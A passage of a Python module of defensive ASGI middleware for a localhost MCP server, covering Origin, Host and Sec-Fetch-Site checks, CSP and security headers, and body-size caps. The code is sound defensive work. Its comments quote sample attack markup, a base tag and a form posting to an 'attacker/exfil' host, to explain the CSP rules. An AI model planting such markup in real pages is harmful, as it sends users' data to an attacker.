"""Security-hardening ASGI middleware (E06_S05).

Three middlewares, all pure-ASGI (the ``BaseHTTPMiddleware`` form was
shown in E06_S01 to silently no-op response interception because
Starlette wraps responses in ``_StreamingResponse``; see F1 in the
E06_S01 critique). All three are mounted in :func:`server.main.create_app`.

1. :class:`OriginValidationMiddleware` — MCP 2025-06-18 spec MUST.
   Returns 403 JSON if an ``Origin`` header is present but its host
   component is not in the loopback allow-list. Requests without an
   ``Origin`` header pass through (CLI tools and the stdio shim do
   not set ``Origin``; the spec note explicitly permits this).
2. :class:`SecurityHeadersMiddleware` — adds
   ``X-Content-Type-Options: nosniff`` and ``X-Frame-Options: DENY``
   to every response. Defense-in-depth: even though the server has
   ``docs_url=None`` (no HTML), a misconfigured proxy or a future
   handler returning text/html should still trip browser hardening.
3. :class:`RequestBodySizeLimitMiddleware` — 1 MB cap on incoming
   request bodies. uvicorn has no built-in knob (verified in
   ``uvicorn/config.py``), so we enforce in middleware: short-circuit
   on a too-large ``Content-Length``; for chunked requests
   accumulate ``http.request`` events and reject once the cap is
   breached.

Mount order in :func:`server.main.create_app` (outermost on
request side first; ``add_middleware`` adds in LIFO request order
so the LAST ``add_middleware`` call wraps the request FIRST):

    app.add_middleware(BodySizeCapMiddleware, ...)            # innermost
    app.add_middleware(RequestBodySizeLimitMiddleware, ...)
    app.add_middleware(OriginValidationMiddleware)
    app.add_middleware(SecurityHeadersMiddleware)             # outermost

This puts SecurityHeaders OUTERMOST so even error responses from
inner middlewares (e.g. OriginValidation's 403) carry the security
headers; OriginValidation is BEFORE the body-limit middleware so an
evil-origin POST is rejected without buffering its body.

**Defense-in-depth note.** The ``mcp`` library's
:class:`TransportSecurityMiddleware` (at
``mcp/server/transport_security.py``) rejects bad-Origin /
bad-Host requests on ``/mcp`` with 403 / 421 respectively, **but
only when** :func:`mcp.server.fastmcp.FastMCP.__init__` auto-enables
it (which happens when the configured ``host`` is in
``("127.0.0.1", "localhost", "::1")``; see
``mcp/server/fastmcp/server.py:178``). Because
:func:`server.config.Config.reject_non_loopback_bind` already pins the
host to a loopback value, FastMCP's protection IS active in the
v1 server — but the dependency is implicit. **Operators must NOT
construct FastMCP with a non-loopback host even in tests, or the
``/mcp`` layer of defense disappears.** The Origin/Host middlewares
in this module add the same rejection across the WHOLE FastAPI app
(``/metrics``, the health endpoints, and any future routes), so
the post-Config layer of defense remains regardless. F11 fix from
the E06_S05 critique.

**MCP spec quotes.** From the 2025-06-18 Streamable HTTP spec:

> Servers MUST validate the ``Origin`` header on all incoming
> connections to prevent DNS rebinding attacks.
>
> When running locally, servers SHOULD bind only to localhost
> (127.0.0.1) rather than all network interfaces (0.0.0.0).

The first MUST is satisfied by :class:`OriginValidationMiddleware`.
The second SHOULD is satisfied by the existing
:func:`server.config.Config.reject_non_loopback_bind` validator
(escalated from SHOULD to MUST for our deployment per the brief).
"""

from __future__ import annotations

import json
import logging
import re
from collections.abc import Awaitable, Callable
from typing import Any
from urllib.parse import urlparse

# F5 fix from the E08_S04 critique: hoist the SessionCapMiddleware's
# server.session import to the top. The previous local-import
# pattern was annotated "cyclic-safe" but no cycle exists
# (server.session imports only stdlib).
from server.session import (
    check_and_increment,  # noqa: F401 — kept for back-compat / external use
    check_both_caps,
    check_hourly_rate_limit,  # noqa: F401 — kept for back-compat / external use
    get_or_create_session,
)

# Dedicated security logger so ops can route security events
# separately. F6: every reject path emits a WARN line.
logger = logging.getLogger("server.middleware.security")

# ---------------------------------------------------------------------------
# Module-level constants
# ---------------------------------------------------------------------------

#: Hosts permitted in the ``Origin`` header. Mirrors the FastMCP
#: built-in's ``allowed_origins=["http://127.0.0.1:*",
#: "http://localhost:*", "http://[::1]:*"]`` so operators don't see
#: surprising rejection differences between ``/mcp`` and the rest of
#: the app.
LOOPBACK_ORIGIN_HOSTS = frozenset({"127.0.0.1", "localhost", "::1"})

#: Hosts permitted in the ``Host`` header. Superset of
#: :data:`LOOPBACK_ORIGIN_HOSTS` plus ``"testserver"`` — the
#: FastAPI/Starlette TestClient default.
#:
#: ``testserver`` is not a real DNS-resolvable hostname; no browser
#: ever sends ``Host: testserver`` over a real network. Accepting it
#: preserves existing test ergonomics without weakening the
#: DNS-rebinding defense (which protects against attacker-controlled
#: domains resolving to 127.0.0.1, not against a fake host name no
#: client uses in production).
LOOPBACK_HOST_HEADER_HOSTS = frozenset(
    {*LOOPBACK_ORIGIN_HOSTS, "testserver"}
)

#: Schemes permitted in the ``Origin`` header. http only; the server
#: is localhost-only and does not terminate TLS in v1. ``https`` would
#: imply a reverse proxy in front of us; if/when that lands, this
#: set grows.
LOOPBACK_ORIGIN_SCHEMES = frozenset({"http"})

#: 1 MB request body cap per the brief. JSON-RPC tool calls in MCP
#: are typically a few KB; 1 MB leaves headroom for unusual filters
#: or batched calls without permitting a memory-exhaustion request.
REQUEST_BODY_MAX_BYTES = 1 * 1024 * 1024

#: ``X-Content-Type-Options`` header value. Stops MIME-sniffing
#: attacks where a browser overrides our declared Content-Type.
X_CONTENT_TYPE_OPTIONS = b"nosniff"

#: ``X-Frame-Options`` header value. Stops the server's responses
#: from being framed in a third-party page (clickjacking defense).
#: ``DENY`` is the strictest setting; ``SAMEORIGIN`` would allow
#: same-origin framing but we have no UI to frame.
X_FRAME_OPTIONS = b"DENY"

#: ``Content-Security-Policy`` value scoped to the ``/ui/*`` UI
#: surface (m8 rect F2). Defense-in-depth on top of Jinja2's
#: explicit autoescape.
#:
#: - ``default-src 'self'`` — all resources from the same origin only.
#: - ``script-src 'self' 'unsafe-inline'`` — vendored htmx.min.js
#:   from /ui/static/ AND the inline JSON-encoding shim in
#:   base.html (m8 rect F1). The ``'unsafe-inline'`` allowance is a
#:   known trade-off: htmx's ``hx-on::*`` attributes use inline
#:   event handlers which CSP would otherwise block, and the F1
#:   shim is an inline ``<script>`` block. The defense remaining
#:   after this allowance is third-party-origin blocking (no
#:   external JS/CDN can run; only same-origin assets). To tighten
#:   further to ``script-src 'self'`` only, a future milestone
#:   would need to:
#:     (a) move the F1 shim to ``frontend/static/json-shim.js``,
#:     (b) replace every ``hx-on::*`` attribute with a vanilla JS
#:         event-listener block in another vendored file, AND
#:     (c) add per-script hashes ``'sha256-...'`` to the policy.
#:   That's m10+ scope; m8 takes the loopback-only / same-origin-
#:   only protection of m7's middleware stack as the primary
#:   defense and the CSP as defense-in-depth against a future
#:   template change that loads a CDN script directly.
#: - ``style-src 'self' 'unsafe-inline'`` — same rationale; minimal
#:   inline ``style=`` would otherwise break.
#: - ``img-src 'self' data:`` — same-origin + ``data:`` URIs.
#: - ``connect-src 'self'`` — only same-origin fetch/XHR.
#: - ``frame-ancestors 'none'`` — no one may frame us (parity
#:   with X-Frame-Options: DENY but enforced via CSP).
CONTENT_SECURITY_POLICY_UI: bytes = (
    b"default-src 'self'; "
    b"script-src 'self' 'unsafe-inline'; "
    b"style-src 'self' 'unsafe-inline'; "
    b"img-src 'self' data:; "
    b"connect-src 'self'; "
    b"frame-ancestors 'none'"
)

#: Tighter CSP for the m10 per-paper preview route
#: (``/ui/notebooks/{slug}/papers/{paper_id}/preview``). The route
#: serves UNTRUSTED HTML (stored ar5iv output from arXiv papers) so
#: the policy is "deny by default" — every directive that does NOT
#: fall back to ``default-src`` is named explicitly.
#:
#: Per CSP3 §6.8.3 ("Get fetch directive fallback list"), only
#: FETCH directives inherit from ``default-src``. Three non-fetch
#: directives need explicit values:
#:
#: - ``base-uri 'none'`` (DOCUMENT directive) — without it, a
#:   ``<base href="https://attacker/">`` in the paper redirects ALL
#:   relative URL resolution to the attacker's origin.
#: - ``form-action 'none'`` (NAVIGATION directive) — without it,
#:   ``<form action="https://attacker/exfil">`` POSTs to the
#:   attacker on user submit.
#: - ``frame-ancestors 'none'`` (NAVIGATION directive) — without
#:   it, any origin can iframe the preview page (clickjacking).
#:   CSP3 §8.4: ``frame-ancestors`` supersedes ``X-Frame-Options``
#:   when both are present, so this directive is load-bearing here
#:   even though the global ``SecurityHeadersMiddleware`` already
#:   emits ``X-Frame-Options: DENY``.
#:
#: ``script-src 'none'`` plus the fallback chain
#: ``script-src-attr`` → ``script-src`` → ``default-src`` also
#: blocks inline event handlers (``onclick="..."``,
#: ``onerror="..."``) per CSP3 §6.1.12.
#:
#: ``img-src 'self' data:`` keeps ar5iv's self-hosted assets +
#: small inline data-URIs working. ``style-src 'self'
#: 'unsafe-inline'`` keeps ar5iv's inline styling working; the
#: ``@import`` URL form of CSS still routes through ``style-src``
#: so external CSS is blocked by ``'self'``.
#:
#: Trade-off documented in the m10 research synthesis: ar5iv math
#: rendering uses MathJax 3 which requires ``script-src 'self'
#: 'unsafe-eval'``. With ``script-src 'none'``, math displays as
#: raw LaTeX markup rather than typeset. Acceptable for v2 m10;
#: server-side KaTeX pre-render is a future-enhancement candidate.
CONTENT_SECURITY_POLICY_PREVIEW: bytes = (
    b"default-src 'none'; "
    b"img-src 'self' data:; "
    b"style-src 'self' 'unsafe-inline'; "
    b"script-src 'none'; "
    b"base-uri 'none'; "
    b"form-action 'none'; "
    b"frame-ancestors 'none'"
)

#: Path prefixes that receive the UI CSP header. Other paths
#: (``/mcp``, ``/metrics``, ``/healthz``) get no CSP — those are
#: JSON / Prometheus / text-only and don't load scripts.
_CSP_UI_PREFIXES: tuple[bytes, ...] = (b"/ui",)


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _get_header(headers: list[tuple[bytes, bytes]], name: bytes) -> bytes | None:
    """Return the value of a header (case-insensitive lookup) or None.

    ASGI represents headers as a list of ``(name_lower, value)`` byte
    tuples. We lowercase the lookup name to be safe; ASGI servers
    already lowercase but some test harnesses don't.
    """
    target = name.lower()
    for k, v in headers:
        if k.lower() == target:
            return v
    return None


#: Maximum number of bytes of an attacker-supplied Origin we echo
#: back in the 403 error body. F13: prevents amplification-style
#: probes. 256 is enough for legitimate origins (which are typically
#: < 50 chars) and short enough that the response stays well under
#: the typical 16 KB header limit.
MAX_ECHOED_ORIGIN_LEN = 256


def _origin_is_allowed(origin: str) -> bool:
    """Return True if ``origin`` is in the loopback allow-list.

    Allows the schemes in :data:`LOOPBACK_ORIGIN_SCHEMES` with the
    hosts in :data:`LOOPBACK_ORIGIN_HOSTS`, with any port (or no
    port). Mirrors FastMCP's ``allowed_origins`` defaults.

    ``urlparse`` lowercases scheme + hostname; we compare against
    lowercase constants. IPv6 hosts are returned without brackets by
    ``urlparse('http://[::1]:1234').hostname``, which matches our
    ``"::1"`` constant.

    **F9 fix:** rejects userinfo-bearing origins
    (``http://user:pass@host``). ``urlparse`` correctly extracts
    ``host`` from ``http://localhost@127.0.0.1`` as ``127.0.0.1``,
    which is loopback — but the userinfo is anomalous and likely
    a smuggling probe. Reject defensively.
    """
    try:
        parsed = urlparse(origin)
    except ValueError:
        return False
    if parsed.scheme not in LOOPBACK_ORIGIN_SCHEMES:
        return False
    # F9: anomalous userinfo on Origin → reject. urlparse exposes
    # parsed.username / .password; both None for normal origins.
    if parsed.username is not None or parsed.password is not None:
        return False
    host = parsed.hostname  # already lowercased; brackets stripped
    if host is None:
        return False
    return host in LOOPBACK_ORIGIN_HOSTS


def _validate_host_header(host_value: str, allowed_port: int | None) -> bool:
    """Return True if a ``Host`` header is acceptable.

    F3: Threat 5 (DNS rebinding) requires Host header validation in
    addition to Origin validation. ``08-security-observability-ops.md``
    line 74: "validate the ``Host`` header is ``127.0.0.1`` or
    ``localhost`` with the configured port."

    A valid Host has the form ``<hostname>[:<port>]``. We accept:
    - hostname in :data:`LOOPBACK_HOST_HEADER_HOSTS` (127.0.0.1,
      localhost, ::1, testserver — the last for TestClient
      compatibility; see the constant's docstring) — IPv6 hosts in
      Host headers carry brackets per RFC 7230 (``[::1]:7733``);
      we strip them before lookup.
    - port equal to ``allowed_port`` if specified, OR any port if
      ``allowed_port`` is None (test mode).

    A missing Host header should be impossible from any HTTP/1.1
    client (it's MUST in RFC 7230 §5.4); we treat absence as pass
    so HTTP/0.9-style probes don't break.
    """
    if not host_value:
        return True  # empty / missing — pass (impossible from real HTTP/1.1)
    # Split host:port. IPv6 hosts have brackets we must preserve when
    # finding the port separator.
    raw = host_value.strip().lower()
    host: str
    port_str: str | None
    if raw.startswith("["):
        # IPv6 form: [::1] or [::1]:7733
        end_bracket = raw.find("]")
        if end_bracket == -1:
            return False  # malformed
        host = raw[1:end_bracket]
        rest = raw[end_bracket + 1 :]
        if rest == "":
            port_str = None
        elif rest.startswith(":"):
            port_str = rest[1:]
        else:
            return False  # garbage after ]
    elif ":" in raw:
        host, port_str = raw.rsplit(":", 1)
    else:
        host = raw
        port_str = None
    if host not in LOOPBACK_HOST_HEADER_HOSTS:
        return False
    if allowed_port is not None and port_str is not None:
        try:
            if int(port_str) != allowed_port:
                return False
        except ValueError:
            return False
    return True


async def _send_json_error(
    send: Callable[[dict], Awaitable[None]],
    status: int,
    body: dict[str, Any],
) -> None:
    """Emit a single-shot JSON error response over ASGI.

    Used by both :class:`OriginValidationMiddleware` (403) and
    :class:`RequestBodySizeLimitMiddleware` (413). Sets a
    ``content-length`` header so clients don't have to chunk-decode.
    """
    payload = json.dumps(body, sort_keys=True).encode("utf-8")
    await send(
        {
            "type": "http.response.start",
            "status": status,
            "headers": [
                (b"content-type", b"application/json"),
                (b"content-length", str(len(payload)).encode("ascii")),
            ],
        }
    )
    await send(
        {
            "type": "http.response.body",
            "body": payload,
            "more_body": False,
        }
    )


# ---------------------------------------------------------------------------
# OriginValidationMiddleware
# ---------------------------------------------------------------------------


class OriginValidationMiddleware:
    """Reject requests with a non-localhost ``Origin`` header.

    Implements the MCP 2025-06-18 spec MUST:

        Servers MUST validate the ``Origin`` header on all incoming
        connections to prevent DNS rebinding attacks.

    Behavior:
    - No ``Origin`` header → pass through. The stdio shim and curl
      do not set ``Origin``; the spec permits this.
    - ``Origin`` present and in the loopback allow-list → pass
      through.
    - ``Origin`` present and in the operator-configured allow-list
      ``allowed_origins`` (E13_S05 — ``ARXMCP_ALLOWED_ORIGINS`` env)
      → pass through. The operator allow-list EXTENDS the loopback
      floor; it never bypasses it (security baseline).
    - ``Origin`` present and NOT in either allow-list → 403 with a
      JSON error body. F6: a WARN log line records the rejection
      (origin value + remote client) so ops can alert on
      DNS-rebinding probes. F13: the echoed origin in the error
      body is truncated to :data:`MAX_ECHOED_ORIGIN_LEN` chars to
      prevent amplification-style probes.

    Args:
        app: The inner ASGI app to forward valid requests to.
        allowed_origins: Optional iterable of additional Origin
            strings (full URLs, lowercase recommended) to accept
            beyond the hardcoded loopback floor. From
            :attr:`server.config.Config.allowed_origins`. Empty
            list = loopback-only (default; preserves E06_S05
            behavior).
    """

    def __init__(
        self,
        app: Callable[..., Awaitable[None]],
        allowed_origins: list[str] | tuple[str, ...] | None = None,
    ) -> None:
        self.app = app
        # Pre-compute the allowed-origin set with normalized form.
        # Strip trailing slashes; lowercase. Empty / blank entries
        # are silently dropped (defensive against env-var typos).
        self._extra_allowed: frozenset[str] = frozenset(
            o.strip().rstrip("/").lower()
            for o in (allowed_origins or [])
            if o and o.strip()
        )

    async def __call__(self, scope: dict, receive: Callable, send: Callable) -> None:
        if scope["type"] != "http":
            await self.app(scope, receive, send)
            return

        headers: list[tuple[bytes, bytes]] = scope.get("headers", [])
        origin_b = _get_header(headers, b"origin")

        if origin_b is None:
            # No Origin → pass through (spec-permitted).
            await self.app(scope, receive, send)
            return

        try:
            origin_str = origin_b.decode("latin-1")
        except UnicodeDecodeError:
            origin_str = ""

        if _origin_is_allowed(origin_str):
            await self.app(scope, receive, send)
            return

        # E13_S05: check the operator-configured extra allow-list
        # AFTER the loopback floor. Both sets accept the same
        # request; this lets ARXMCP_ALLOWED_ORIGINS add browser-
        # facing companion tools (e.g. an arXMCP dashboard) without
        # weakening the default deny.
        if self._extra_allowed and origin_str.strip().rstrip("/").lower() in self._extra_allowed:
            await self.app(scope, receive, send)
            return

        # F6: WARN log on rejection. Include client IP for alert
        # routing. We log the full origin for ops; the response body
        # truncates to defend against amplification.
        client = scope.get("client")
        client_ip = client[0] if client else "unknown"
        logger.warning(
            "origin rejected: client=%s origin=%r path=%s",
            client_ip, origin_str, scope.get("path", ""),
        )

        # F13: truncate origin in response body to avoid amplification.
        echoed = origin_str[:MAX_ECHOED_ORIGIN_LEN]

        # Reject with 403 + JSON body. The MCP spec does not mandate
        # a specific body shape; we use ``{error, message}`` to match
        # :class:`server.main.BodySizeCapMiddleware`'s 413 shape.
        await _send_json_error(
            send,
            status=403,
            body={
                "error": "origin_forbidden",
                "message": (
                    "Origin header is not in the loopback allow-list "
                    "(http://127.0.0.1, http://localhost, http://[::1]). "
                    "MCP 2025-06-18 spec MUST: servers validate Origin "
                    "to prevent DNS rebinding attacks."
                ),
                "origin": echoed,
            },
        )


# ---------------------------------------------------------------------------
# SecFetchSiteMiddleware (E13_S05 — Threat 5 defense-in-depth)
# ---------------------------------------------------------------------------


class SecFetchSiteMiddleware:
    """Reject requests whose ``Sec-Fetch-Site`` header is not ``none``.

    The Fetch Metadata spec defines four values:

    - ``none`` — top-level navigation initiated by the user
      (address bar, bookmark, ``curl`` does not set the header).
    - ``same-origin`` — browser fetch from the same origin.
    - ``same-site`` — browser fetch from the same registrable
      domain, different origin.
    - ``cross-site`` — browser fetch from a different registrable
      domain.

    Defense-in-depth layer (E13_S05 Threat 5): a localhost MCP
    server has NO same-origin / same-site / cross-site partner —
    any of those values means a browser tab is fetching the server,
    which is precisely the DNS-rebinding attack surface. The header
    is browser-only and cannot be forged by page scripts (it is a
    "forbidden header name" in the Fetch spec). CLI tools (the
    stdio shim, curl, mcp-cli) do not send it.

    Behavior:

    - No ``Sec-Fetch-Site`` header → pass through. The stdio shim,
      curl, and most non-browser MCP clients omit it; the spec
      permits this.
    - ``Sec-Fetch-Site: none`` → pass through (user-initiated
      navigation from the browser).
    - Any other value (``cross-site`` / ``same-site`` /
      ``same-origin`` / empty / garbage) → 403 with a JSON error
      body. WARN log on rejection.

    Pure-ASGI. Mounted BEFORE :class:`OriginValidationMiddleware`
    so the cheap byte-comparison fires first on attacker-shaped
    browser traffic.

    The MCP 2025-06-18 spec does NOT mandate this check (it only
    mandates Origin validation as MUST). Sec-Fetch-Site is project-
    specific defense-in-depth from the design note at
    ``.claude/notes/08-security-observability-ops.md`` § Threat 5:
    *"`Sec-Fetch-Site: none` enforced where possible."*
    """

    #: The only permitted value when the header IS present on
    #: non-exempt paths (i.e. `/mcp`).
    _ALLOWED_VALUE = b"none"

    #: Permitted values on paths matched by ``exempt_prefixes``. The
    #: relaxation is from `{none}` to `{none, same-origin}` — the
    #: htmx UI legitimately carries `same-origin` on its in-page
    #: fetch() POSTs, but `cross-site` / `same-site` / garbage from
    #: another local app must STILL be rejected (m7 rect F1 — the
    #: original implementation bypassed the check entirely, enabling
    #: cross-app CSRF from any other process listening on 127.0.0.1
    #: on a different port).
    _UI_ALLOWED_VALUES: frozenset[bytes] = frozenset({
        b"none", b"same-origin",
    })

    def __init__(
        self,
        app: Callable[..., Awaitable[None]],
        exempt_prefixes: tuple[str, ...] = (),
    ) -> None:
        """Initialize.

        Args:
            app: The downstream ASGI app.
            exempt_prefixes: Path prefixes that RELAX the
                Sec-Fetch-Site allow-set from ``{none}`` to
                ``{none, same-origin}``. Used by the m7 UI surface
                (``/ui/*``) where same-origin htmx requests from
                the in-page UI to the same daemon's REST API MUST
                be allowed despite carrying
                ``Sec-Fetch-Site: same-origin``. NOT a full bypass —
                ``cross-site`` / ``same-site`` / garbage from
                another local app are STILL rejected (m7 rect F1).
                Match form: ``path == prefix`` OR
                ``path.startswith(prefix + "/")`` — prefix-match,
                NOT substring (FM-3 from m7 synthesis; prevents
                ``/evil-ui/foo`` from accidentally matching ``/ui``).
        """
        self.app = app
        self._exempt_prefixes: tuple[str, ...] = exempt_prefixes

    async def __call__(self, scope: dict, receive: Callable, send: Callable) -> None:
        if scope["type"] != "http":
            await self.app(scope, receive, send)
            return

        headers: list[tuple[bytes, bytes]] = scope.get("headers", [])
        sec_fetch_site = _get_header(headers, b"sec-fetch-site")

        # m7 (rect F1): path-prefix exemption RELAXES the allow-set
        # for `/ui/*` from {none} to {none, same-origin}. This lets
        # legitimate htmx posts from the in-page UI pass while still
        # rejecting cross-app CSRF attempts that would otherwise
        # forge a `cross-site` POST from some other localhost port.
        path = scope.get("path", "")
        is_exempt_path = any(
            path == p or path.startswith(p + "/")
            for p in self._exempt_prefixes
        )
        if is_exempt_path:
            if sec_fetch_site is None or sec_fetch_site in self._UI_ALLOWED_VALUES:
                await self.app(scope, receive, send)
                return
            # Fall through to the standard rejection envelope below.

        elif sec_fetch_site is None or sec_fetch_site == self._ALLOWED_VALUE:
            # Non-exempt path (e.g. /mcp): only `none` or absent
            # passes — the original Threat 5 DNS-rebinding defense.
            await self.app(scope, receive, send)
            return

        # Any other value — reject. Log at WARN for ops alerting on
        # browser-initiated probes against the localhost server.
        client = scope.get("client")
        client_ip = client[0] if client else "unknown"
        try:
            sec_fetch_site_str = sec_fetch_site.decode("latin-1")
        except UnicodeDecodeError:
            sec_fetch_site_str = "<undecodable>"
        logger.warning(
            "Sec-Fetch-Site rejected: client=%s value=%r path=%s",
            client_ip, sec_fetch_site_str, scope.get("path", ""),
        )

        await _send_json_error(
            send,
            status=403,
            body={
                "error": "sec_fetch_site_forbidden",
                "message": (
                    "Sec-Fetch-Site header is not 'none'; only top-level "
                    "user-initiated navigation (or no header at all) is "
                    "accepted. This is a defense-in-depth check against "
                    "browser-mediated DNS-rebinding attacks "
                    "(E13_S05 Threat 5)."
                ),
                "sec_fetch_site": sec_fetch_site_str[:MAX_ECHOED_ORIGIN_LEN],
            },
        )


# ---------------------------------------------------------------------------
# HostValidationMiddleware (F3 — Threat 5 / DNS rebinding)
# ---------------------------------------------------------------------------


class HostValidationMiddleware:
    """Reject requests whose ``Host`` header is not loopback.

    F3 fix from the E06_S05 critique: Threat 5
    (``08-security-observability-ops.md`` line 74) mandates DNS
    rebinding defense via Host header validation in addition to
    Origin validation. FastMCP's built-in
    :class:`TransportSecurityMiddleware` validates Host only on
    ``/mcp``; this middleware extends the same protection across
    ``/healthz``, ``/readyz``, ``/metrics``, and any future routes.

    Returns 421 Misdirected Request on bad Host (matches FastMCP's
    signal) so well-behaved clients can detect the difference between
    Origin and Host failures.

    A request with no ``Host`` header passes through. RFC 7230 §5.4
    makes Host MUST for HTTP/1.1, so absent-Host should be impossible
    in practice; permitting it preserves compatibility with HTTP/0.9
    probes and test harnesses that don't set the header.
    """

    def __init__(
        self,
        app: Callable[..., Awaitable[None]],
        allowed_port: int | None = None,
    ) -> None:
        self.app = app
        # ``allowed_port=None`` accepts any port — test harnesses
        # use this to avoid coupling tests to the live bind port.
        self.allowed_port = allowed_port

    async def __call__(self, scope: dict, receive: Callable, send: Callable) -> None:
        if scope["type"] != "http":
            await self.app(scope, receive, send)
            return

        headers: list[tuple[bytes, bytes]] = scope.get("headers", [])
        host_b = _get_header(headers, b"host")

        if host_b is None:
            await self.app(scope, receive, send)
            return

        try:
            host_str = host_b.decode("latin-1")
        except UnicodeDecodeError:
            host_str = ""

        if _validate_host_header(host_str, self.allowed_port):
            await self.app(scope, receive, send)
            return

        client = scope.get("client")
        client_ip = client[0] if client else "unknown"
        logger.warning(
            "host rejected: client=%s host=%r path=%s",
            client_ip, host_str, scope.get("path", ""),
        )

        echoed = host_str[:MAX_ECHOED_ORIGIN_LEN]
        await _send_json_error(
            send,
            status=421,
            body={
                "error": "host_forbidden",
                "message": (
                    "Host header is not in the loopback allow-list. "
                    "DNS rebinding defense (Threat 5)."
                ),
                "host": echoed,
            },
        )


# ---------------------------------------------------------------------------
# SecurityHeadersMiddleware
# ---------------------------------------------------------------------------


class SecurityHeadersMiddleware:
    """Add ``X-Content-Type-Options`` and ``X-Frame-Options`` to every response.

    Defense-in-depth: the v1 server has ``docs_url=None`` so it never
    serves HTML, but a future handler that does (or a misconfigured
    proxy that fronts the server) should still trip browser
    hardening. The two headers cost ~50 bytes per response and have
    no operational downside.

    Why intercept the start event: ASGI delivers headers in the
    ``http.response.start`` event. We capture that event, append our
    two headers, and forward. This is the canonical pattern; see
    Starlette's own ``CORSMiddleware`` for the same shape.

    Idempotency: if a downstream handler somehow already set one of
    our headers (a custom test route, say), we do NOT overwrite. The
    pre-existing value wins. This avoids surprise behavior in tests
    that explicitly probe header values.
    """

    def __init__(self, app: Callable[..., Awaitable[None]]) -> None:
        self.app = app

    async def __call__(self, scope: dict, receive: Callable, send: Callable) -> None:
        if scope["type"] != "http":
            await self.app(scope, receive, send)
            return

        # m8 rect F2: scope the CSP to /ui/* paths. Same prefix-match
        # form as the m7 SecFetchSite carve-out (path == p OR
        # path.startswith(p + "/")), so /uiOTHER does NOT get a CSP.
        path_b = scope.get("path", "").encode("latin-1", errors="replace")
        is_ui_path = any(
            path_b == p or path_b.startswith(p + b"/")
            for p in _CSP_UI_PREFIXES
        )

        async def wrapped_send(event: dict) -> None:
            if event["type"] != "http.response.start":
                await send(event)
                return
            headers: list[tuple[bytes, bytes]] = list(event.get("headers", []))
            existing = {k.lower() for k, _ in headers}
            if b"x-content-type-options" not in existing:
                headers.append((b"x-content-type-options", X_CONTENT_TYPE_OPTIONS))
            if b"x-frame-options" not in existing:
                headers.append((b"x-frame-options", X_FRAME_OPTIONS))
            # m8 rect F2: CSP for UI surface only. JSON/MCP/metrics
            # paths don't load scripts and don't need a CSP.
            if is_ui_path and b"content-security-policy" not in existing:
                headers.append(
                    (b"content-security-policy", CONTENT_SECURITY_POLICY_UI)
                )
            event = {**event, "headers": headers}
            await send(event)

        await self.app(scope, receive, wrapped_send)


# ---------------------------------------------------------------------------
# RequestBodySizeLimitMiddleware
# ---------------------------------------------------------------------------


#: HTTP methods whose body the cap-middleware does NOT pre-read.
#: Per RFC 7231 these methods don't carry a payload semantically; if a
#: client sends one anyway, our cap doesn't enforce because the body is
#: irrelevant to the handler. (We still reject over-cap Content-Length
#: at the early-rejection path regardless of method.)
_BODY_NOT_EXPECTED_METHODS = frozenset({"GET", "HEAD", "OPTIONS", "DELETE", "TRACE"})


class RequestBodySizeLimitMiddleware:
    """Cap incoming request bodies at ``max_bytes``.

    uvicorn has no ``limit_request_body`` knob (verified in
    ``uvicorn/config.py`` — only ``limit_max_requests`` exists), so
    the cap MUST live in middleware.

    **Closes F1 from the E06_S05 critique.** The original implementation
    wrapped ``receive`` and counted bytes only when the handler called
    ``await req.body()``. Handlers that ignore the body (e.g.
    ``/healthz`` returning ``{"status":"ok"}`` without consuming
    request bytes) bypassed the cap silently — uvicorn had already
    buffered the wire bytes and our 413 never fired. Real reproducer:
    POST 1.6 MB chunked to ``/healthz`` returned 200, not 413.

    The fix is **eager pre-read**: for any method that may carry a
    body, the middleware drains ``receive`` BEFORE invoking the inner
    app, accumulating bytes into a buffer. If the running total
    exceeds ``max_bytes``, we send 413 directly and never invoke the
    inner app. Otherwise we replay the buffered events via a
    synthetic receive callable.

    Cost: 1 MB of additional buffering per request — bounded by the
    cap itself. The MCP JSON-RPC handlers parse the full body before
    responding, so we lose no streaming the inner app actually used.

    Three rejection paths:

    1. **Over-cap Content-Length** — reject 413 before any body read.
    2. **Malformed Content-Length** (negative, non-integer) — reject
       400. Closes F10. A malformed C-L is a smuggling signal, not a
       benign typo.
    3. **Body bytes accumulate past the cap during pre-read** — reject
       413 mid-stream and stop forwarding to the inner app.

    Parameters
    ----------
    app:
        The wrapped ASGI app.
    max_bytes:
        Default body-size cap in bytes. Defaults to
        :data:`REQUEST_BODY_MAX_BYTES` (1 MB).
    prefix_caps:
        Optional per-prefix cap overrides. When a request's
        ``scope["path"]`` matches a key (``path == p`` OR
        ``path.startswith(p + "/")`` — prefix-match, NOT substring;
        same form as :class:`SecFetchSiteMiddleware`'s ``exempt_prefixes``
        for FM-3 parity), the corresponding value replaces
        ``max_bytes`` for that request. Used by m8 to raise the cap
        from 1 MB to 10 MB on ``/ui/api/notebooks/*/papers/upload``
        (ar5iv HTML files can exceed 1 MB). Defaults to ``{}`` —
        every request uses ``max_bytes``.
    """

    def __init__(
        self,
        app: Callable[..., Awaitable[None]],
        max_bytes: int = REQUEST_BODY_MAX_BYTES,
        prefix_caps: dict[str, int] | None = None,
    ) -> None:
        self.app = app
        self.max_bytes = max_bytes
        self._prefix_caps: dict[str, int] = prefix_caps or {}

    def _effective_max_bytes(self, path: str) -> int:
        """Return the cap that applies to ``path``.

        Prefix-match form (``path == p`` or ``path.startswith(p + "/")``)
        — NOT substring, to prevent ``/ui-evil/foo`` from accidentally
        matching ``/ui`` (FM-3 from m7 synthesis). If multiple
        prefixes match, the cap from the FIRST iteration of
        ``self._prefix_caps`` wins (dict insertion order on 3.7+);
        callers should pass prefixes in priority order if they
        configure overlapping ones.
        """
        for prefix, cap in self._prefix_caps.items():
            if path == prefix or path.startswith(prefix + "/"):
                return cap
        return self.max_bytes

    async def __call__(self, scope: dict, receive: Callable, send: Callable) -> None:
        if scope["type"] != "http":
            await self.app(scope, receive, send)
            return

        # m8 rect: resolve the effective cap once per request based on
        # ``scope["path"]``. All downstream byte-count checks use this
        # value rather than ``self.max_bytes`` directly.
        max_bytes = self._effective_max_bytes(scope.get("path", ""))

        # Rejection path 1+2: Content-Length declared.
        headers = scope.get("headers", [])
        content_length_b = _get_header(headers, b"content-length")
        if content_length_b is not None:
            try:
                declared = int(content_length_b.decode("ascii"))
            except (ValueError, UnicodeDecodeError):
                # F10: malformed C-L → 400, NOT silently treated as
                # "no length". Smuggling signal.
                logger.warning(
                    "request rejected: malformed content-length header %r",
                    content_length_b,
                )
                await _send_json_error(
                    send,
                    status=400,
                    body={
                        "error": "malformed_content_length",
                        "message": (
